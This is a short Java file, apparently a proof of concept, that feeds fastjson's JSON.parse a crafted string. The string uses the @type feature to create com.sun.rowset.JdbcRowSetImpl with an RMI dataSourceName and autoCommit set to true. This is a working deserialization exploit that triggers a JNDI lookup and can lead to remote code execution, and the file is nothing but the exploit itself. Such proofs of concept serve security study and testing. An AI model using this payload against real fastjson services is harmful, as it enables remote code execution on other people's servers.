import com.alibaba.fastjson.JSON;

public class HighJdkBypass {
    public static void main(String[] args) {
        String json = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\",\"autoCommit\":true}";
        JSON.parse(json);
    }
}
